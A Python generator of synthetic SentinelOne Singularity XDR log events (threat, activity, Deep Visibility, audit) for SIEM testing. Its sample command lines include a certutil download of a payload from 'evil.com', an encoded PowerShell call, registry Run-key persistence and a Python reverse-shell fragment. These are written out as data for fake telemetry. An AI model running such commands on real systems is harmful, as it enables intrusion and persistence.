"""SentinelOne Singularity XDR log generator — threats, activities, and audit events.

Matches the SentinelOne Singularity platform SIEM connector / Syslog / API
export format. Covers: Threat (malware, exploit, PUA, lateral movement),
Activity (agent, user, system), Deep Visibility (process, network, file,
registry, DNS), and Audit (management console actions).
Fields match real SentinelOne Singularity 24.1+ output.
"""

from __future__ import annotations
import random
from datetime import datetime, timezone, timedelta
from typing import Any
from generators import generate_ip, generate_hostname, generate_uuid

_ACCOUNT_IDS = ["1234567890123456789", "9876543210987654321"]
_ACCOUNT_NAMES = ["Contoso Corp", "RoarinPenguin"]
_SITE_IDS = ["1111111111111111111", "2222222222222222222"]
_SITE_NAMES = ["HQ-Production", "Branch-Office", "Cloud-Workloads", "Remote-Endpoints"]
_GROUP_IDS = ["3333333333333333333", "4444444444444444444"]
_GROUP_NAMES = ["Default Group", "Servers", "Workstations", "VDI", "Linux Servers"]
_HOSTNAMES = ["DESKTOP-HQ01", "LAPTOP-SALES02", "SRV-DC-01", "SRV-WEB-02",
              "LAPTOP-ENG03", "DESKTOP-FIN04", "SRV-DB-01", "WORKSTATION-IT05",
              "SRV-EXCHANGE-01", "SRV-FILE-01"]
_OS_TYPES = ["windows", "windows", "windows", "linux", "macos"]
_OS_NAMES = ["Windows 11 Pro 23H2", "Windows 10 Enterprise 22H2", "Windows Server 2022",
             "Windows Server 2019", "Ubuntu 22.04.3 LTS", "macOS 14.4 Sonoma",
             "RHEL 9.3", "CentOS Stream 9"]
_USERS = ["CORP\\jsmith", "CORP\\agarcia", "CORP\\mwilson", "CORP\\lchen",
          "CORP\\admin", "LOCAL\\svc-backup", "root"]
_AGENT_VERSIONS = ["24.1.2.5", "24.1.1.3", "23.4.6.3", "23.3.3.437"]
_TACTICS = ["Initial Access", "Execution", "Persistence", "Privilege Escalation",
            "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement",
            "Collection", "Command and Control", "Exfiltration", "Impact"]
_TECHNIQUES = [
    ("TA0001", "T1566", "Phishing"), ("TA0002", "T1059", "Command and Scripting Interpreter"),
    ("TA0002", "T1059.001", "PowerShell"), ("TA0003", "T1547", "Boot or Logon Autostart Execution"),
    ("TA0004", "T1055", "Process Injection"), ("TA0006", "T1003", "OS Credential Dumping"),
    ("TA0006", "T1003.001", "LSASS Memory"), ("TA0008", "T1021", "Remote Services"),
    ("TA0008", "T1021.002", "SMB/Windows Admin Shares"),
    ("TA0011", "T1071", "Application Layer Protocol"), ("TA0040", "T1486", "Data Encrypted for Impact"),
    ("TA0005", "T1218", "System Binary Proxy Execution"), ("TA0005", "T1218.011", "Rundll32"),
    ("TA0002", "T1204", "User Execution"), ("TA0006", "T1558", "Steal or Forge Kerberos Tickets"),
]
_THREAT_NAMES = [
    "Suspicious PowerShell Command", "LSASS Access Detected", "Cobalt Strike Beacon",
    "Lateral Movement via PsExec", "Ransomware Behavior - File Encryption",
    "Malicious DLL Side-Loading", "Process Injection - CreateRemoteThread",
    "Reverse Shell Established", "Kerberoasting Attempt", "DCSync Attack",
    "Mimikatz Credential Dumping", "Living Off The Land - Certutil Download",
    "Registry Run Key Persistence", "Scheduled Task Persistence",
    "WMI Remote Execution", "Unauthorized Remote Access Tool",
    "Suspicious DNS Query - DGA", "Data Exfiltration Over HTTPS",
]
_CLASSIFICATIONS = ["Malware", "Trojan", "Ransomware", "Exploit", "PUA",
                     "Infostealer", "Backdoor", "Worm", "Dropper"]
_ENGINES = ["On-Write Static AI", "On-Write Dynamic AI", "Behavioral AI",
            "Cloud Intelligence", "Application Control", "Anti-Tampering",
            "Ranger", "Identity", "STAR Custom Rule"]
_ANALYST_VERDICTS = ["undefined", "suspicious", "true_positive", "false_positive"]
_INCIDENT_STATUSES = ["new", "in_progress", "resolved", "unresolved"]
_MITIGATION_STATUSES = ["not_mitigated", "mitigated", "partially_mitigated"]
_MITIGATION_ACTIONS = ["kill", "quarantine", "remediate", "rollback", "network_quarantine"]
_CONFIDENCE_LEVELS = ["malicious", "suspicious", "n/a"]
_PROCESS_NAMES = ["cmd.exe", "powershell.exe", "rundll32.exe", "wmic.exe", "certutil.exe",
                  "mshta.exe", "cscript.exe", "regsvr32.exe", "svchost.exe", "explorer.exe",
                  "python3", "bash", "curl", "wget"]


def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds") + "Z"


def _agent(ctx=None) -> dict[str, Any]:
    pm = ctx.pick_machine() if ctx else None
    hostname = pm.get("primary_workstation", random.choice(_HOSTNAMES)) if pm else random.choice(_HOSTNAMES)
    os_type = random.choice(_OS_TYPES)
    return {
        "agentId": generate_uuid(),
        "computerName": hostname,
        "domain": random.choice(["CORP", "BRANCH", "WORKGROUP"]),
        "machineType": random.choice(["desktop", "server", "laptop", "kubernetes node"]),
        "osType": os_type,
        "osName": random.choice([n for n in _OS_NAMES if (os_type == "windows" and "Windows" in n) or
                                  (os_type == "linux" and ("Ubuntu" in n or "RHEL" in n or "CentOS" in n)) or
                                  (os_type == "macos" and "macOS" in n)] or _OS_NAMES[:3]),
        "agentVersion": random.choice(_AGENT_VERSIONS),
        "isActive": True,
        "isInfected": random.random() < 0.15,
        "networkStatus": random.choice(["connected", "connected", "connected", "disconnected"]),
        "externalIp": generate_ip(),
        "lastIpToMgmt": generate_ip(),
        "uuid": generate_uuid(),
        "siteId": random.choice(_SITE_IDS),
        "siteName": random.choice(_SITE_NAMES),
        "accountId": random.choice(_ACCOUNT_IDS),
        "accountName": random.choice(_ACCOUNT_NAMES),
        "groupId": random.choice(_GROUP_IDS),
        "groupName": random.choice(_GROUP_NAMES),
    }


def _threat_event(ctx=None) -> dict[str, Any]:
    pu = ctx.pick_user() if ctx else None
    pmal = ctx.pick_malware() if ctx else None
    pc2 = ctx.pick_c2() if ctx else None
    agent = _agent(ctx)
    user = pu.get("username", random.choice(_USERS)) if pu else random.choice(_USERS)
    tactic_id, technique_id, technique_name = random.choice(_TECHNIQUES)
    threat_name = pmal.get("filename", random.choice(_THREAT_NAMES)) if pmal else random.choice(_THREAT_NAMES)
    classification = random.choice(_CLASSIFICATIONS)
    engine = random.choice(_ENGINES)
    confidence = random.choices(_CONFIDENCE_LEVELS, weights=[60, 30, 10])[0]
    cmdline = pmal.get("cmdline", f"{random.choice(_PROCESS_NAMES)} /c whoami") if pmal else random.choice([
        "powershell.exe -enc UwB0AGEAcgB0AC0A", "cmd.exe /c whoami /all",
        "rundll32.exe shell32.dll,ShellExec_RunDLL", "certutil.exe -urlcache -f http://evil.com/payload.exe",
        "wmic process call create calc.exe", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "python3 -c 'import socket,subprocess;s=socket.socket()'",
    ])
    return {
        "id": generate_uuid(), "threatId": generate_uuid(),
        "type": "threat",
        "threatInfo": {
            "threatName": threat_name,
            "classification": classification,
            "classificationSource": engine,
            "confidenceLevel": confidence,
            "analystVerdict": random.choice(_ANALYST_VERDICTS),
            "incidentStatus": random.choice(_INCIDENT_STATUSES),
            "mitigationStatus": random.choice(_MITIGATION_STATUSES),
            "mitigationActions": random.sample(_MITIGATION_ACTIONS, k=random.randint(1, 3)),
            "engines": [engine],
            "initiatedBy": random.choice(["agent_policy", "cloud_detection", "star_manual", "full_disk_scan"]),
            "originatorProcess": cmdline.split()[0].split("\\")[-1],
            "filePath": random.choice(["C:\\Windows\\System32\\", "C:\\Users\\Public\\", "C:\\ProgramData\\",
                                        "/tmp/", "/var/tmp/", "/usr/local/bin/"]),
            "sha256": pmal.get("hash", generate_uuid().replace("-", "") * 2) if pmal else generate_uuid().replace("-", "") * 2,
            "processUser": user,
            "commandLineArguments": cmdline,
            "storyline": generate_uuid(),
        },
        "mitre": {
            "tactic": {"id": tactic_id, "name": random.choice(_TACTICS)},
            "technique": {"id": technique_id, "name": technique_name},
        },
        "agentRealtimeInfo": agent,
        "indicators": [{"category": "InfoStealer", "description": technique_name, "ids": [random.randint(1, 999)]}] if random.random() < 0.5 else [],
        "createdAt": _now(), "updatedAt": _now(),
        "severity": random.choices(["Critical", "High", "Medium", "Low"], weights=[15, 30, 35, 20])[0],
        "vendor": "SentinelOne", "product": "Singularity",
    }


def _activity_event(ctx=None) -> dict[str, Any]:
    agent = _agent(ctx)
    pu = ctx.pick_user() if ctx else None
    user = pu.get("username", random.choice(_USERS)) if pu else random.choice(_USERS)
    activities = [
        (1, "Agent Installed", "Agent installed successfully", "informational"),
        (2, "Agent Started", "Agent service started", "informational"),
        (3, "Agent Shutdown", "Agent service stopped", "warning"),
        (17, "Threat Mitigated", "Threat was successfully mitigated", "informational"),
        (18, "Threat Not Mitigated", "Threat mitigation failed", "high"),
        (23, "Agent Scan Started", "Full disk scan initiated", "informational"),
        (24, "Agent Scan Completed", "Full disk scan completed - {} threats found".format(random.randint(0, 5)), "informational"),
        (27, "Agent Policy Updated", "Policy updated from management console", "informational"),
        (33, "User Login", f"User {user} logged in", "informational"),
        (52, "Network Quarantine", f"Agent {agent['computerName']} isolated from network", "high"),
        (53, "Network Quarantine Lifted", f"Agent {agent['computerName']} network isolation removed", "informational"),
        (65, "Threat Rollback", "Rollback completed for threat", "informational"),
        (70, "Remote Shell Opened", f"Remote shell session opened by {user}", "warning"),
        (71, "Remote Shell Closed", "Remote shell session closed", "informational"),
        (80, "Application Blocked", "Application execution blocked by policy", "warning"),
        (86, "Ranger Scan", "New device discovered: {}".format(generate_ip()), "informational"),
        (90, "Identity Detection", f"Suspicious identity behavior for {user}", "high"),
        (3600, "STAR Custom Rule", "Custom detection rule triggered", "high"),
    ]
    act_id, primary, desc, sev = random.choice(activities)
    return {
        "id": generate_uuid(),
        "type": "activity", "subtype": primary.lower().replace(" ", "_"),
        "activityType": act_id,
        "primaryDescription": primary,
        "secondaryDescription": desc,
        "agentId": agent["agentId"],
        "agentRealtimeInfo": agent,
        "userId": generate_uuid(),
        "userFullName": user.replace("CORP\\", "").replace("LOCAL\\", ""),
        "data": {"computerName": agent["computerName"], "username": user},
        "createdAt": _now(), "updatedAt": _now(),
        "severity": sev,
        "vendor": "SentinelOne", "product": "Singularity",
    }


def _dv_event(ctx=None) -> dict[str, Any]:
    """Deep Visibility (DV) telemetry event."""
    agent = _agent(ctx)
    pc2 = ctx.pick_c2() if ctx else None
    event_types = [
        ("Process", "process_creation"), ("Process", "process_exit"),
        ("Network", "ip_connect"), ("Network", "dns_query"),
        ("File", "file_creation"), ("File", "file_modification"), ("File", "file_deletion"),
        ("Registry", "registry_set_value"), ("Registry", "registry_create_key"),
        ("Login", "login_success"), ("Login", "login_failure"),
    ]
    cat, subtype = random.choice(event_types)
    proc = random.choice(_PROCESS_NAMES)
    ev = {
        "id": generate_uuid(),
        "type": "deep_visibility", "subtype": subtype,
        "eventType": subtype,
        "category": cat,
        "agentRealtimeInfo": agent,
        "processName": proc,
        "processId": random.randint(100, 65535),
        "parentProcessName": random.choice(["explorer.exe", "svchost.exe", "bash", "systemd"]),
        "processUser": random.choice(_USERS),
        "storyline": generate_uuid(),
        "createdAt": _now(),
        "severity": "informational",
        "vendor": "SentinelOne", "product": "Singularity",
    }
    if cat == "Network":
        ev["dstIp"] = pc2.get("ip_c2") if pc2 else generate_ip()
        ev["dstPort"] = random.choice([80, 443, 8080, 4444, 53, 8443, 3389])
        ev["srcIp"] = generate_ip()
        ev["srcPort"] = random.randint(1024, 65535)
        ev["direction"] = random.choice(["OUTGOING", "INCOMING"])
        if subtype == "dns_query":
            ev["dnsRequest"] = pc2.get("fqdn", generate_hostname()) if pc2 else generate_hostname()
            ev["dnsResponse"] = generate_ip()
    elif cat == "File":
        ev["filePath"] = random.choice(["C:\\Users\\Public\\Downloads\\", "C:\\Windows\\Temp\\",
                                         "/tmp/", "/var/log/"]) + random.choice(["payload.exe", "config.dat", "update.dll", "log.txt"])
        ev["fileSha256"] = generate_uuid().replace("-", "") * 2
    elif cat == "Registry":
        ev["registryPath"] = random.choice([
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
            "HKCU\\SOFTWARE\\Classes\\CLSID\\{random}\\InProcServer32",
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\suspicious_svc",
        ])
    return ev


def _audit_event(ctx=None) -> dict[str, Any]:
    user = random.choice(["admin@contoso.com", "soc-analyst@contoso.com", "svc-api@contoso.com"])
    actions = [
        ("User logged in", "login", "informational"),
        ("User logged out", "logout", "informational"),
        ("Updated site policy", "policy_update", "informational"),
        ("Created exclusion", "exclusion_create", "warning"),
        ("Deleted exclusion", "exclusion_delete", "warning"),
        ("Changed user role", "role_change", "warning"),
        ("Exported threat data", "data_export", "informational"),
        ("Created API token", "api_token_create", "warning"),
        ("Revoked API token", "api_token_revoke", "informational"),
        ("Initiated remote shell", "remote_shell", "warning"),
        ("Network quarantine endpoint", "network_quarantine", "high"),
        ("Ran script on endpoint", "remote_script", "warning"),
        ("Modified STAR rule", "star_rule_update", "informational"),
        ("Created notification rule", "notification_create", "informational"),
    ]
    desc, subtype, sev = random.choice(actions)
    return {
        "id": generate_uuid(),
        "type": "audit", "subtype": subtype,
        "description": desc,
        "userId": generate_uuid(),
        "userEmail": user,
        "userFullName": user.split("@")[0].replace("-", " ").title(),
        "sourceIp": generate_ip(),
        "accountId": random.choice(_ACCOUNT_IDS),
        "accountName": random.choice(_ACCOUNT_NAMES),
        "siteId": random.choice(_SITE_IDS),
        "siteName": random.choice(_SITE_NAMES),
        "createdAt": _now(),
        "severity": sev,
        "vendor": "SentinelOne", "product": "Singularity",
    }


_GENERATORS = [
    (_threat_event, 35), (_activity_event, 25), (_dv_event, 25), (_audit_event, 15),
]
_GEN_FUNCS = [g for g, _ in _GENERATORS]
_GEN_WEIGHTS = [w for _, w in _GENERATORS]

def generate_event(ctx=None) -> dict[str, Any]:
    gen = random.choices(_GEN_FUNCS, weights=_GEN_WEIGHTS, k=1)[0]
    return gen(ctx=ctx)
